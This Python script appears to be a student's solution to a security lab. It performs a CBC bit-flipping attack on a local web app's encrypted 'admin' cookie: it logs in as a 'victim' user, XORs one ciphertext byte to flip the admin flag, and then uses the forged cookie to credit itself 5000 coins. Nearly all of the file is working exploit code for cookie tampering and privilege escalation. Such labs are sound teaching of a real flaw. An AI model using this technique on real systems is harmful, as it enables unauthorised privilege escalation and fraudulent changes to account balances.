from requests import codes, Session
import requests

import app.api.encr_decr

LOGIN_FORM_URL = "http://localhost:8080/login"
SETCOINS_FORM_URL = "http://localhost:8080/setcoins"

def do_login_form(sess, username,password):
    data_dict = {"username":username,\
      "password":password,\
      "login":"Login"
    }
    response = sess.post(LOGIN_FORM_URL,data_dict)
    return response.status_code == codes.ok

def do_setcoins_form(sess,uname, coins):
    data_dict = {"username":uname,\
    "amount":str(coins),\
    }
    response = sess.post(SETCOINS_FORM_URL, data_dict)
    print("Response code: {}".format(response.status_code))
    return response.status_code == codes.ok

def do_attack():
    sess = Session()
    print("Cookie pre logon: {}".format(sess.cookies.get_dict()))
    # TODO: you'll need to change this to a non-admin user, such as 'victim'.
    uname ="victim"
    pw = "victim"
    assert(do_login_form(sess, uname,pw))
    print("Cookies after logon: {}".format(sess.cookies.get_dict()))
    
    # TODO: Maul the admin cookie in the 'sess' object here
    admin_cookie = sess.cookies.get_dict()["admin"]
    print("Admin cookie: {}".format(admin_cookie))
    # admin_cookie_bytes = bytearray(admin_cookie, 'utf-8')
    admin_cookie_bytes = bytearray.fromhex(admin_cookie)
    print("Admin cookie bytes: {}".format(admin_cookie_bytes))
    a = admin_cookie_bytes[0]
    b = 1
    c = a ^ b
    admin_cookie_bytes[0] = c
    print("XOR value: {}".format(c))
    print("Mauled: {}".format(admin_cookie_bytes))
    maul = admin_cookie_bytes.hex()
    print("Mauled string: {}".format(maul))

    # print("Byte array {}".format(admin_cookie_bytes))
    # admin_cookie_bytes[0] = 1
    # print("Byte array mauled {}".format(admin_cookie_bytes))
    # print("byte array mauled string {}".format(admin_cookie_bytes.decode()))
    # maul = admin_cookie_bytes.decode('utf-8')
    # print("Maul: {}".format(maul))
    # maul = "{}".format(maul)
    # print("Maul take 2: {}".format(maul))

    # TODO: Try a list instead of byte array
    # admin_cookie_list = list(admin_cookie)
    # print("List: {}".format(admin_cookie_list))
    # a = int(admin_cookie_list[0], 16)
    # b = 1
    # c = a ^ b
    # admin_cookie_list[0] = str(c)
    # print("Mauled List: {}".format(admin_cookie_list))
    # maul = "".join(map(str, admin_cookie_list))
    # print("New maul: {}".format(maul))
    
    # Set new admin cookie
    # sess_cookie = sess.cookies.get_dict()["session"]
    # jar = requests.cookies.RequestsCookieJar()
    # jar.set("admin", None)
    # jar.set("admin", admin_cookie_bytes.decode())
    # jar.set("session", sess_cookie)
    # sess.cookies = jar

    # TODO: Don't need the full jar, just set cookie
    sess.cookies.set("admin", None)
    sess.cookies.set("admin", maul)
    print("Cookies after maul: {}".format(sess.cookies.get_dict()))
    
    # FINDME: Shouldn't need to go through decryption b/c we won't know encryption key IRL
    # # Initialize the CBC with our encryption key
    # encryption_key = b'\x00' * 16 # x00 works but x01 fails b/c of wrong padding
    # cbc = app.api.encr_decr.Encryption(encryption_key)
    # 
    # # Admin bytes 0x00 (not admin) or 0x01 (admin) concatentated with plaintext password
    # admin_cookie_pt = app.api.encr_decr.format_plaintext(int(True), pw)
    # print("admin cookie plaintext: "+ str(admin_cookie_pt))
    # ctxt = cbc.encrypt(admin_cookie_pt)
    # print("Cipher text: {}".format(ctxt))
    # 
    # # Update cookies after encrypting our new admin cookie
    # sess_cookie = sess.cookies.get_dict()["session"]
    # jar = requests.cookies.RequestsCookieJar()
    # jar.set("admin", None)
    # jar.set("admin", ctxt.hex())
    # jar.set("session", sess_cookie)
    # sess.cookies = jar
    # print("Cookies after encryption: {}".format(sess.cookies.get_dict()))
    
    # Send myself 5000 coins via the admin's power
    target_uname = uname
    amount = 5000
    result = do_setcoins_form(sess, target_uname, amount)
    print("Attack successful? " + str(result))

if __name__=='__main__':
    do_attack()
